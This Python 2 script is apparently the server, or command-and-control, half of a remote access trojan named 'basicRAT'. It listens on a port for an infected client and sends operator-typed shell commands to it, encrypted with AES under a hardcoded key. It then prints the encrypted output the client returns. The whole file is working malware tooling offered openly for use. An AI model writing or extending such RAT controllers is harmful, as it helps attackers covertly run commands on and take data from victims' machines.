#!/usr/bin/env python
# -*- coding: utf-8 -*-

import readline
import socket
import sys

from Crypto import Random
from Crypto.Cipher import AES

try:
    PORT = int(sys.argv[1])
except:
    print 'Usage: ./basicRAT_server.py <port>'
    sys.exit(1)

HOST = 'localhost'
KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10)
    print 'basicRAT server listening on port {}...'.format(PORT)

    conn, _ = s.accept()

    while True:
        cmd = raw_input('basicRAT> ').rstrip()

        # allow noop
        if cmd == '':
            continue

        # send command to client
        conn.send(encrypt(cmd))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        data = conn.recv(4096)
        print decrypt(data)


if __name__ == '__main__':
    main()
